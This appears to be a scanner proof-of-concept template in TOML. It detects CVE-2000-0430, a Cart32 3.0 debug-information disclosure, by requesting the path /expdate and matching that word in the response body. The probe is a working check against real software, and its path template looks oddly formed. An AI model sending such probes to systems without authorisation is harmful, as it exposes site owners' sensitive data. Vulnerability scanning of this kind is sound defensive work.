[info]
author = "ave"
description = "验证 Cart32 3.0 管理调试信息泄露漏洞：通过在目标 URL 后追加 /expdate 路径访问敏感调试信息"
id = "POC-AVE-2000-0353"
name = "CVE-2000-0430 PoC"
severity = "medium"
tags = ["ave-2000-0353"]
vuln_id = [
    "CVE-2000-0430",
    "AVE-2000-0353",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/expdate"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["expdate"]
